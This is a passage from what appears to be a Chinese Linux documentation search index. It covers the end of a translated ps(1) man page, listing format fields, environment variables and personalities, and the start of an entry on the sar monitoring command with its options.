\u6b64\u8fdb\u7a0b\u53d1\u751f\u7684\u6b21\u8981\u9875\u9762\u9519\u8bef\u6570\u3002 mntns MNTNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 netns NETNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 ni NI nice \u503c\u3002\u8303\u56f4\u4ece 19\uff08\u6700\u53cb\u597d\uff09\u5230 -20\uff08\u5bf9\u5176\u4ed6\u7528\u6237\u4e0d\u53cb\u597d\uff09\uff0c\u53c2\u89c1 nice(1)\u3002\uff08\u522b\u540d nice\uff09\u3002 nice NI \u53c2\u89c1 ni\u3002\uff08\u522b\u540d ni\uff09\u3002 nlwp NLWP \u8fdb\u7a0b\u4e2d\u7684 lwps\uff08\u7ebf\u7a0b\uff09\u6570\u91cf\u3002\uff08\u522b\u540d thcount\uff09\u3002 numa NUMA \u4e0e\u6700\u8fd1\u4f7f\u7528\u7684\u5904\u7406\u5668\u76f8\u5173\u8054\u7684\u8282\u70b9\u3002-1 \u8868\u793a NUMA \u4fe1\u606f\u4e0d\u53ef\u7528\u3002 nwchan WCHAN \u8fdb\u7a0b\u6b63\u5728\u4f11\u7720\u7684\u5185\u6838\u51fd\u6570\u7684\u5730\u5740\uff08\u5982\u679c\u60a8\u60f3\u8981\u5185\u6838\u51fd\u6570\u540d\u79f0\uff0c\u8bf7\u4f7f\u7528 wchan\uff09\u3002\u8fd0\u884c\u4e2d\u7684\u4efb\u52a1\u5c06\u5728\u6b64\u5217\u4e2d\u663e\u793a\u4e00\u4e2a\u7834\u6298\u53f7\uff08\u2018-\u2019\uff09\u3002 ouid OWNER \u663e\u793a\u8fdb\u7a0b\u4f1a\u8bdd\u6240\u6709\u8005\u7684 Unix \u7528\u6237\u6807\u8bc6\u7b26\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 pcpu %CPU \u53c2\u89c1 %cpu\u3002\uff08\u522b\u540d %cpu\uff09\u3002 pending PENDING \u6302\u8d77\u4fe1\u53f7\u7684\u63a9\u7801\u3002\u53c2\u89c1 signal(7)\u3002\u6302\u8d77\u5728\u8fdb\u7a0b\u4e0a\u7684\u4fe1\u53f7\u4e0e\u6302\u8d77\u5728\u5355\u4e2a\u7ebf\u7a0b\u4e0a\u7684\u4fe1\u53f7\u4e0d\u540c\u3002\u4f7f\u7528 m \u9009\u9879\u6216 -m \u9009\u9879\u67e5\u770b\u4e24\u8005\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig\uff09\u3002 pgid PGID \u8fdb\u7a0b\u7ec4 ID\uff0c\u6216\u76f8\u5f53\u4e8e\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u8005\u7684\u8fdb\u7a0b ID\u3002\uff08\u522b\u540d pgrp\uff09\u3002 pgrp PGRP \u53c2\u89c1 pgid\u3002\uff08\u522b\u540d pgid\uff09\u3002 pid PID \u8868\u793a\u8fdb\u7a0b ID \u7684\u6570\u5b57\uff08\u522b\u540d tgid\uff09\u3002 pidns PIDNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 pmem %MEM \u53c2\u89c1 %mem\u3002\uff08\u522b\u540d %mem\uff09\u3002 policy POL \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7c7b\u3002\uff08\u522b\u540d class, cls\uff09\u3002\u53ef\u80fd\u7684\u503c\u4e3a\uff1a - \u672a\u62a5\u544a TS SCHED_OTHER FF SCHED_FIFO RR SCHED_RR B SCHED_BATCH ISO SCHED_ISO IDL SCHED_IDLE DLN SCHED_DEADLINE ? \u672a\u77e5\u503c ppid PPID \u7236\u8fdb\u7a0b ID\u3002 pri PRI \u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u3002\u6570\u503c\u8d8a\u9ad8\uff0c\u4f18\u5148\u7ea7\u8d8a\u4f4e\u3002 psr PSR \u5f53\u524d\u5206\u914d\u7ed9\u8fdb\u7a0b\u7684\u5904\u7406\u5668\u3002 rgid RGID \u5b9e\u9645\u7ec4 ID\u3002 rgroup RGROUP \u5b9e\u9645\u7ec4\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 rss RSS \u5e38\u9a7b\u96c6\u5927\u5c0f\uff0c\u4efb\u52a1\u4f7f\u7528\u7684\u975e\u4ea4\u6362\u7269\u7406\u5185\u5b58\uff08\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u3002\uff08\u522b\u540d rssize, rsz\uff09\u3002 rssize RSS \u53c2\u89c1 rss\u3002\uff08\u522b\u540d rss, rsz\uff09\u3002 rsz RSZ \u53c2\u89c1 rss\u3002\uff08\u522b\u540d rss, rssize\uff09\u3002 rtprio RTPRIO \u5b9e\u65f6\u4f18\u5148\u7ea7\u3002 ruid RUID \u5b9e\u9645\u7528\u6237 ID\u3002 ruser RUSER \u5b9e\u9645\u7528\u6237 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 s S \u6700\u5c0f\u72b6\u6001\u663e\u793a\uff08\u4e00\u4e2a\u5b57\u7b26\uff09\u3002\u6709\u5173\u4e0d\u540c\u503c\u7684\u542b\u4e49\uff0c\u8bf7\u53c2\u89c1\u8fdb\u7a0b\u72b6\u6001\u4ee3\u7801\u90e8\u5206\u3002\u53c2\u89c1 stat \u4ee5\u663e\u793a\u5176\u4ed6\u4fe1\u606f\u3002\uff08\u522b\u540d state\uff09\u3002 sched SCH \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7b56\u7565\u3002\u8c03\u5ea6\u7b56\u7565 SCHED_OTHER (SCHED_NORMAL), SCHED_FIFO, SCHED_RR, SCHED_BATCH, SCHED_ISO, SCHED_IDLE \u548c SCHED_DEADLINE \u5206\u522b\u663e\u793a\u4e3a 0, 1, 2, 3, 4, 5 \u548c 6\u3002 seat SEAT \u663e\u793a\u4e0e\u7279\u5b9a\u5de5\u4f5c\u533a\u5206\u914d\u7684\u6240\u6709\u786c\u4ef6\u8bbe\u5907\u76f8\u5173\u8054\u7684\u6807\u8bc6\u7b26\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 sess SESS \u4f1a\u8bdd ID\uff0c\u6216\u76f8\u5f53\u4e8e\u4f1a\u8bdd\u9886\u5bfc\u8005\u7684\u8fdb\u7a0b ID\u3002\uff08\u522b\u540d session, sid\uff09\u3002 sgi_p P \u8fdb\u7a0b\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u5904\u7406\u5668\u3002\u663e\u793a\u201c*\u201d\u5982\u679c\u8fdb\u7a0b\u5f53\u524d\u672a\u8fd0\u884c\u6216\u4e0d\u53ef\u8fd0\u884c\u3002 sgid SGID \u4fdd\u5b58\u7684\u7ec4 ID\u3002\uff08\u522b\u540d svgid\uff09\u3002 sgroup SGROUP \u4fdd\u5b58\u7684\u7ec4\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 sid SID \u53c2\u89c1 sess\u3002\uff08\u522b\u540d sess, session\uff09\u3002 sig PENDING \u53c2\u89c1 pending\u3002\uff08\u522b\u540d pending, sig_pend\uff09\u3002 sigcatch CAUGHT \u53c2\u89c1 caught\u3002\uff08\u522b\u540d caught, sig_catch\uff09\u3002 sigignore IGNORED \u53c2\u89c1 ignored\u3002\uff08\u522b\u540d ignored, sig_ignore\uff09\u3002 sigmask BLOCKED \u53c2\u89c1 blocked\u3002\uff08\u522b\u540d blocked, sig_block\uff09\u3002 size SIZE \u8fdb\u7a0b\u4f7f\u7528\u7684\u8fd1\u4f3c\u4ea4\u6362\u7a7a\u95f4\u5927\u5c0f\uff08\u5982\u679c\u8fdb\u7a0b\u5c06\u6240\u6709\u53ef\u5199\u9875\u9762\u5f04\u810f\u7136\u540e\u88ab\u4ea4\u6362\u51fa\u53bb\uff09\u3002\u8fd9\u4e2a\u6570\u5b57\u975e\u5e38\u7c97\u7565\uff01 slice SLICE \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u5207\u7247\u5355\u5143\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 spid SPID \u53c2\u89c1 lwp\u3002\uff08\u522b\u540d lwp, tid\uff09\u3002 stackp STACKP \u8fdb\u7a0b\u6808\u5e95\uff08\u5f00\u59cb\uff09\u5730\u5740\u3002 start STARTED \u547d\u4ee4\u542f\u52a8\u65f6\u95f4\u3002\u5982\u679c\u8fdb\u7a0b\u5728\u8fc7\u53bb 24 \u5c0f\u65f6\u5185\u542f\u52a8\uff0c\u8f93\u51fa\u683c\u5f0f\u4e3a\u201cHH:MM:SS\u201d\uff0c\u5426\u5219\u4e3a\u201c Mmm dd\u201d\uff08\u5176\u4e2d Mmm \u662f\u4e09\u5b57\u6bcd\u6708\u4efd\u540d\u79f0\uff09\u3002\u53c2\u89c1 lstart\u3001bsdstart\u3001start_time \u548c stime\u3002 start_time START \u8fdb\u7a0b\u7684\u542f\u52a8\u65f6\u95f4\u6216\u65e5\u671f\u3002\u4ec5\u5f53\u8fdb\u7a0b\u672a\u5728\u8c03\u7528 ps \u7684\u540c\u4e00\u5e74\u542f\u52a8\u65f6\uff0c\u624d\u4f1a\u663e\u793a\u5e74\u4efd\uff0c\u6216\u201c MmmDD\u201d\uff08\u5982\u679c\u4e0d\u662f\u540c\u4e00\u5929\u542f\u52a8\uff09\uff0c\u6216\u201cHH:MM\u201d\uff08\u5426\u5219\uff09\u3002\u53c2\u89c1 bsdstart\u3001start\u3001lstart \u548c stime\u3002 stat STAT \u591a\u5b57\u7b26\u8fdb\u7a0b\u72b6\u6001\u3002\u6709\u5173\u4e0d\u540c\u503c\u7684\u542b\u4e49\uff0c\u8bf7\u53c2\u89c1\u8fdb\u7a0b\u72b6\u6001\u4ee3\u7801\u90e8\u5206\u3002\u53c2\u89c1 s \u548c state \u5982\u679c\u60a8\u53ea\u60f3\u663e\u793a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\uff08\u522b\u540d state\uff09\u3002 state S \u53c2\u89c1 s\u3002\uff08\u522b\u540d s\uff09\u3002 stime STIME \u53c2\u89c1 start_time\u3002\uff08\u522b\u540d start_time\uff09\u3002 suid SUID \u4fdd\u5b58\u7684\u7528\u6237 ID\u3002\uff08\u522b\u540d svuid\uff09\u3002 supgid SUPGID \u8865\u5145\u7ec4\u7684\u7ec4 ID\uff08\u5982\u679c\u6709\uff09\u3002\u53c2\u89c1 getgroups(2)\u3002 supgrp SUPGRP \u8865\u5145\u7ec4\u7684\u7ec4\u540d\uff08\u5982\u679c\u6709\uff09\u3002\u53c2\u89c1 getgroups(2)\u3002 suser SUSER \u4fdd\u5b58\u7684\u7528\u6237\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d svuser\uff09\u3002 svgid SVGID \u53c2\u89c1 sgid\u3002\uff08\u522b\u540d sgid\uff09\u3002 svuid SVUID \u53c2\u89c1 suid\u3002\uff08\u522b\u540d suid\uff09\u3002 sz SZ \u8fdb\u7a0b\u7684\u6838\u5fc3\u6620\u50cf\u7684\u7269\u7406\u9875\u9762\u5927\u5c0f\u3002\u8fd9\u5305\u62ec\u6587\u672c\u3001\u6570\u636e\u548c\u6808\u7a7a\u95f4\u3002\u8bbe\u5907\u6620\u5c04\u5f53\u524d\u88ab\u6392\u9664\uff1b\u6b64\u72b6\u51b5\u53ef\u80fd\u4f1a\u66f4\u6539\u3002\u53c2\u89c1 vsz \u548c rss\u3002 tgid TGID \u8868\u793a\u4efb\u52a1\u6240\u5c5e\u7684\u7ebf\u7a0b\u7ec4\u7684\u6570\u5b57\uff08\u522b\u540d pid\uff09\u3002\u5b83\u662f\u7ebf\u7a0b\u7ec4\u9886\u5bfc\u8005\u7684\u8fdb\u7a0b ID\u3002 thcount THCNT \u53c2\u89c1 nlwp\u3002\uff08\u522b\u540d nlwp\uff09\u3002\u8fdb\u7a0b\u62e5\u6709\u7684\u5185\u6838\u7ebf\u7a0b\u6570\u91cf\u3002 tid TID \u8868\u793a\u53ef\u8c03\u5ea6\u5b9e\u4f53\u7684\u552f\u4e00\u7f16\u53f7\uff08\u522b\u540d lwp, spid\uff09\u3002\u6b64\u503c\u4e5f\u53ef\u80fd\u663e\u793a\u4e3a\uff1a\u8fdb\u7a0b ID (pid)\uff1b\u8fdb\u7a0b\u7ec4 ID (pgrp)\uff1b\u4f1a\u8bdd ID\uff08\u5bf9\u4e8e\u4f1a\u8bdd\u9886\u5bfc\u8005\uff09(sid)\uff1b\u7ebf\u7a0b\u7ec4 ID\uff08\u5bf9\u4e8e\u7ebf\u7a0b\u7ec4\u9886\u5bfc\u8005\uff09(tgid)\uff1b\u4ee5\u53ca tty \u8fdb\u7a0b\u7ec4 ID\uff08\u5bf9\u4e8e\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u8005\uff09(tpgid)\u3002 time TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u201c[DD-]HH:MM:SS\u201d\u683c\u5f0f\u3002\uff08\u522b\u540d cputime\uff09\u3002 times TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d times TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff08\u522b\u540d cputimes\uff09\u3002 tname TTY \u63a7\u5236 tty\uff08\u7ec8\u7aef\uff09\u3002\uff08\u522b\u540d tt, tty\uff09\u3002 tpgid TPGID \u8fde\u63a5\u5230 tty\uff08\u7ec8\u7aef\uff09\u7684\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684 ID\uff0c\u5982\u679c\u8fdb\u7a0b\u672a\u8fde\u63a5\u5230 tty\uff0c\u5219\u4e3a -1\u3002 trs TRS \u6587\u672c\u5e38\u9a7b\u96c6\u5927\u5c0f\uff0c\u5206\u914d\u7ed9\u53ef\u6267\u884c\u4ee3\u7801\u7684\u7269\u7406\u5185\u5b58\u91cf\u3002 tt TT \u63a7\u5236 tty\uff08\u7ec8\u7aef\uff09\u3002\uff08\u522b\u540d tname, tty\uff09\u3002 tty TT \u63a7\u5236 tty\uff08\u7ec8\u7aef\uff09\u3002\uff08\u522b\u540d tname, tt\uff09\u3002 ucmd CMD \u53c2\u89c1 comm\u3002\uff08\u522b\u540d comm, ucomm\uff09\u3002 ucomm COMMAND \u53c2\u89c1 comm\u3002\uff08\u522b\u540d comm, ucmd\uff09\u3002 uid UID \u53c2\u89c1 euid\u3002\uff08\u522b\u540d euid\uff09\u3002 uname USER \u53c2\u89c1 euser\u3002\uff08\u522b\u540d euser, user\uff09\u3002 unit UNIT \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u5355\u5143\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 user USER \u53c2\u89c1 euser\u3002\uff08\u522b\u540d euser, uname\uff09\u3002 userns USERNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 utsns UTSNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 uunit UUNIT \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u7528\u6237\u5355\u5143\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 vsize VSZ \u53c2\u89c1 vsz\u3002\uff08\u522b\u540d vsz\uff09\u3002 vsz VSZ \u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5927\u5c0f\uff0c\u4ee5 KiB\uff081024 \u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u8868\u793a\u3002\u8bbe\u5907\u6620\u5c04\u5f53\u524d\u88ab\u6392\u9664\uff1b\u6b64\u72b6\u51b5\u53ef\u80fd\u4f1a\u66f4\u6539\u3002\uff08\u522b\u540d vsize\uff09\u3002 wchan WCHAN \u8fdb\u7a0b\u6b63\u5728\u4f11\u7720\u7684\u5185\u6838\u51fd\u6570\u540d\u79f0\uff0c\u5982\u679c\u8fdb\u7a0b\u6b63\u5728\u8fd0\u884c\uff0c\u5219\u4e3a\u201c-\u201d\uff0c\u5982\u679c\u8fdb\u7a0b\u662f\u591a\u7ebf\u7a0b\u4e14 ps \u672a\u663e\u793a\u7ebf\u7a0b\uff0c\u5219\u4e3a\u201c*\u201d\u3002 \u73af\u5883\u53d8\u91cf \u4ee5\u4e0b\u73af\u5883\u53d8\u91cf\u53ef\u80fd\u4f1a\u5f71\u54cd ps\uff1a COLUMNS \u8986\u76d6\u9ed8\u8ba4\u663e\u793a\u5bbd\u5ea6\u3002 LINES \u8986\u76d6\u9ed8\u8ba4\u663e\u793a\u9ad8\u5ea6\u3002 PS_PERSONALITY \u8bbe\u7f6e\u4e3a posix, old, linux, bsd, sun, digital... \u4e4b\u4e00\uff08\u53c2\u89c1\u4e0b\u6587\u4e2a\u6027\u90e8\u5206\uff09\u3002 CMD_ENV \u8bbe\u7f6e\u4e3a posix, old, linux, bsd, sun, digital... \u4e4b\u4e00\uff08\u53c2\u89c1\u4e0b\u6587\u4e2a\u6027\u90e8\u5206\uff09\u3002 I_WANT_A_BROKEN_PS \u5f3a\u5236\u4f7f\u7528\u8fc7\u65f6\u7684\u547d\u4ee4\u884c\u89e3\u91ca\u3002 LC_TIME \u65e5\u671f\u683c\u5f0f\u3002 PS_COLORS \u5f53\u524d\u4e0d\u652f\u6301\u3002 PS_FORMAT \u9ed8\u8ba4\u8f93\u51fa\u683c\u5f0f\u8986\u76d6\u3002\u60a8\u53ef\u4ee5\u5c06\u5176\u8bbe\u7f6e\u4e3a\u7528\u4e8e -o \u9009\u9879\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002DefSysV \u548c DefBSD \u503c\u7279\u522b\u6709\u7528\u3002 POSIXLY_CORRECT \u4e0d\u627e\u501f\u53e3\u5ffd\u7565\u574f\u7684\u201c\u7279\u6027\u201d\u3002 POSIX2 \u8bbe\u7f6e\u4e3a\u201con\u201d\u65f6\uff0c\u8868\u73b0\u4e3a POSIXLY_CORRECT\u3002 UNIX95 \u4e0d\u627e\u501f\u53e3\u5ffd\u7565\u574f\u7684\u201c\u7279\u6027\u201d\u3002 _XPG \u53d6\u6d88 CMD_ENV=irix \u7684\u975e\u6807\u51c6\u884c\u4e3a\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u8bbe\u7f6e\u8fd9\u4e9b\u53d8\u91cf\u662f\u4e2a\u574f\u4e3b\u610f\u3002\u552f\u4e00\u7684\u4f8b\u5916\u662f CMD_ENV \u6216 PS_PERSONALITY\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a Linux \u4ee5\u7528\u4e8e\u6b63\u5e38\u7cfb\u7edf\u3002\u5982\u679c\u6ca1\u6709\u8be5\u8bbe\u7f6e\uff0cps \u5c06\u9075\u5faa Unix98 \u6807\u51c6\u4e2d\u7684\u65e0\u7528\u548c\u4e0d\u826f\u90e8\u5206\u3002 \u4e2a\u6027 390 \u7c7b\u4f3c OS/390 OpenEdition ps aix \u7c7b\u4f3c AIX ps bsd \u7c7b\u4f3c FreeBSD ps\uff08\u5b8c\u5168\u975e\u6807\u51c6\uff09 compaq \u7c7b\u4f3c Digital Unix ps debian \u7c7b\u4f3c\u65e7\u7248 Debian ps digital \u7c7b\u4f3c Tru64\uff08\u66fe\u662f Digital Unix\uff0c\u66fe\u662f OSF/1\uff09ps gnu \u7c7b\u4f3c\u65e7\u7248 Debian ps hp \u7c7b\u4f3c HP-UX ps hpux \u7c7b\u4f3c HP-UX ps irix \u7c7b\u4f3c Irix ps linux ***** \u63a8\u8350 ***** old \u7c7b\u4f3c\u539f\u59cb Linux ps\uff08\u5b8c\u5168\u975e\u6807\u51c6\uff09 os390 \u7c7b\u4f3c OS/390 Open Edition ps posix \u6807\u51c6 s390 \u7c7b\u4f3c OS/390 Open Edition ps sco \u7c7b\u4f3c SCO ps sgi \u7c7b\u4f3c Irix ps solaris2 \u7c7b\u4f3c Solaris 2+ (SunOS 5) ps sunos4 \u7c7b\u4f3c SunOS 4 (Solaris 1) ps\uff08\u5b8c\u5168\u975e\u6807\u51c6\uff09 svr4 \u6807\u51c6 sysv \u6807\u51c6 tru64 \u7c7b\u4f3c Tru64\uff08\u66fe\u662f Digital Unix\uff0c\u66fe\u662f OSF/1\uff09ps unix \u6807\u51c6 unix95 \u6807\u51c6 unix98 \u6807\u51c6 \u53e6\u89c1 pgrep(1), pstree(1), top(1), proc(5). \u6807\u51c6 \u6b64 ps \u7b26\u5408\u4ee5\u4e0b\u6807\u51c6\uff1a 1 \u5355\u4e00 Unix \u89c4\u8303\u7248\u672c 2 2 \u5f00\u653e\u7ec4\u6280\u672f\u6807\u51c6\u57fa\u7840\u89c4\u8303\uff0c\u7b2c 6 \u7248 3 IEEE Std 1003.1, 2004 \u7248 4 X/Open \u7cfb\u7edf\u63a5\u53e3\u6269\u5c55 [UP XSI] 5 ISO/IEC 9945:2003 \u4f5c\u8005 ps \u6700\u521d\u7531 Branko Lankester \u27e8lankeste@fwi.uva.nl\u27e9 \u7f16\u5199\u3002Michael K. Johnson \u27e8johnsonm@redhat.com\u27e9 \u8fdb\u884c\u4e86\u91cd\u5927\u91cd\u5199\u4ee5\u4f7f\u7528 proc \u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u5728\u6b64\u8fc7\u7a0b\u4e2d\u66f4\u6539\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002Michael Shields \u27e8mjshield@nyx.cs.du.edu\u27e9 \u6dfb\u52a0\u4e86 pid \u5217\u8868\u529f\u80fd\u3002Charles Blake \u27e8cblake@bbn.com\u27e9 \u6dfb\u52a0\u4e86\u591a\u7ea7\u6392\u5e8f\u3001dirent \u98ce\u683c\u5e93\u3001\u8bbe\u5907\u540d\u79f0\u5230\u7f16\u53f7\u7684\u6620\u5c04\u6570\u636e\u5e93\u3001 System.map \u4e0a\u7684\u8fd1\u4f3c\u4e8c\u8fdb\u5236\u641c\u7d22\uff0c\u4ee5\u53ca\u8bb8\u591a\u4ee3\u7801\u548c\u6587\u6863\u6e05\u7406\u3002David Mossberger-Tang \u4e3a psupdate \u7f16\u5199\u4e86\u901a\u7528 BFD \u652f\u6301\u3002 Albert Cahalan \u27e8albert@users.sf.net\u27e9 \u91cd\u5199\u4e86 ps \u4ee5\u5b8c\u5168\u652f\u6301 Unix98 \u548c BSD\uff0c\u4ee5\u53ca\u4e00\u4e9b\u4e11\u964b\u7684\u9ed1\u5ba2\u5904\u7406\u8fc7\u65f6\u548c\u5916\u6765\u8bed\u6cd5\u3002 \u8bf7\u5c06\u9519\u8bef\u62a5\u544a\u53d1\u9001\u5230 \u27e8procps@freelists.org\u27e9\u3002\u65e0\u9700\u8ba2\u9605\u6216\u5efa\u8bae\u8ba2\u9605\u3002 procps-ng 2020-06-04 PS(1) https://man7.org/linux/man-pages/man1/ps.1.html","title":"\u6392\u5e8f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/","text":"sar\u547d\u4ee4 sar\u5de5\u5177\u5c06\u5bf9\u7cfb\u7edf\u5f53\u524d\u7684\u72b6\u6001\u8fdb\u884c\u53d6\u6837\uff0c\u7136\u540e\u901a\u8fc7\u8ba1\u7b97\u6570\u636e\u548c\u6bd4\u4f8b\u6765\u8868\u8fbe\u7cfb\u7edf\u7684\u5f53\u524d\u8fd0\u884c\u72b6\u6001\u3002\u5b83\u7684\u7279\u70b9\u662f\u53ef\u4ee5\u8fde\u7eed\u5bf9\u7cfb\u7edf\u53d6\u6837\uff0c\u83b7\u5f97\u5927\u91cf\u7684\u53d6\u6837\u6570\u636e\u3002\u53d6\u6837\u6570\u636e\u548c\u5206\u6790\u7684\u7ed3\u679c\u90fd\u53ef\u4ee5\u5b58\u5165\u6587\u4ef6\uff0c\u4f7f\u7528\u5b83\u65f6\u6d88\u8017\u7684\u7cfb\u7edf\u8d44\u6e90\u5f88\u5c0f\u3002 \u8bed\u6cd5\u683c\u5f0f \uff1asar [ \u9009\u9879 ] [ <\u65f6\u95f4\u95f4\u9694> [ <\u6b21\u6570> ] ] \u5e38\u7528\u53c2\u6570\uff1a \ufeff sar -h \u663e\u793a\uff1a -A\uff1a\u6240\u6709\u62a5\u544a\u7684\u603b\u548c -e\uff1a\u8bbe\u7f6e\u663e\u793a\u62a5\u544a\u7684\u7ed3\u675f\u65f6\u95f4 -f\uff1a\u4ece\u5236\u5b9a\u7684\u6587\u4ef6\u8bfb\u53d6\u62a5\u544a -i\uff1a\u8bbe\u7f6e\u72b6\u6001\u4fe1\u606f\u5237\u65b0\u7684\u95f4\u9694\u65f6\u95f4 -P\uff1a\u62a5\u544a\u6bcf\u4e2aCPU\u7684\u72b6\u6001 -x\uff1a\u663e\u793a\u7ed9\u5b9a\u8fdb\u7a0b\u7684\u88c5 [root@VM-0-16-centos ~]# sar -h \u7528\u6cd5: sar [ \u9009\u9879 ] [ <\u65f6\u95f4\u95f4\u9694> [ <\u6b21\u6570> ] ] \u4e3b\u9009\u9879\u548c\u62a5\u544a\uff1a -b I/O \u548c\u4f20\u8f93\u901f\u7387\u4fe1\u606f\u72b6\u51b5 -B \u5206\u9875\u72b6\u51b5 -d \u5757\u8bbe\u5907\u72b6\u51b5 -F [ MOUNT ] Filesystems statistics -H \u4ea4\u6362\u7a7a\u95f4\u5229\u7528\u7387 -I { <\u4e2d\u65ad> | SUM | ALL | XALL } \u4e2d\u65ad\u4fe1\u606f\u72b6\u51b5 -m { <\u5173\u952e\u8bcd> [,...] | ALL } \u7535\u6e90\u7ba1\u7406\u7edf\u8ba1\u4fe1\u606f \u5173\u952e\u5b57: CPU CPU \u9891\u7387 FAN \u98ce\u6247\u901f\u5ea6 \\t\\tFREQ\\tCPU \u5e73\u5747\u65f6\u949f\u9891\u7387 IN \u8f93\u5165\u7535\u538b TEMP \u8bbe\u5907\u6e29\u5ea6 \\t\\tUSB\\t\u8fde\u63a5\u7684USB \u8bbe\u5907 -n { <\u5173\u952e\u8bcd> [,...] | ALL } \u7f51\u7edc\u7edf\u8ba1\u4fe1\u606f \u5173\u952e\u8bcd\u53ef\u4ee5\u662f\uff1a DEV \u7f51\u5361 EDEV \u7f51\u5361 (\u9519\u8bef) NFS NFS \u5ba2\u6237\u7aef NFSD NFS \u670d\u52a1\u5668 SOCK Sockets (\u5957\u63a5\u5b57) (v4) IP IP \u6d41 (v4) EIP IP \u6d41 (v4) (\u9519\u8bef) ICMP ICMP \u6d41 (v4) EICMP ICMP \u6d41 (v4) (\u9519\u8bef) TCP TCP \u6d41 (v4) ETCP TCP \u6d41 (v4) (\u9519\u8bef) UDP UDP \u6d41 (v4) SOCK6 Sockets (\u5957\u63a5\u5b57) (v6) IP6 IP \u6d41 (v6) EIP6 IP \u6d41 (v6) (\u9519\u8bef) ICMP6 ICMP \u6d41 (v6) EICMP6 ICMP \u6d41 (v6) (\u9519\u8bef) UDP6 UDP \u6d41 (v6) -q \u961f\u5217\u957f\u5ea6\u548c\u5e73\u5747\u8d1f\u8f7d -r \u5185\u5b58\u5229\u7528\u7387 -R \u5185\u5b58\u72b6\u51b5 -S \u4ea4\u6362\u7a7a\u95f4\u5229\u7528\u7387 -u [ ALL ] CPU \u5229\u7528\u7387 -v Kernel table \u72b6\u51b5 -w \u4efb\u52a1\u521b\u5efa\u4e0e\u7cfb\u7edf\u8f6c\u6362\u7edf\u8ba1\u4fe1\u606f -W \u4ea4\u6362\u4fe1\u606f -y TTY \u8bbe\u5907\u72b6\u51b5 $ sar --help \u7528\u6cd5: sar [ \u9009\u9879 ] [ <\u65f6\u95f4\u95f4\u9694> [ <\u6b21\u6570> ] ] Options are: [ -A ] [ -B ] [ -b ] [ -C ] [ -d ] [ -F [ MOUNT ] ] [ -H ] [ -h ] [ -p ] [ -q ] [ -R ] [ -r ] [ -S ] [ -t ] [ -u [ ALL ] ] [ -V ] [ -v ] [ -W ] [ -w ] [ -y ] [ -I { <int> [,...] | SUM | 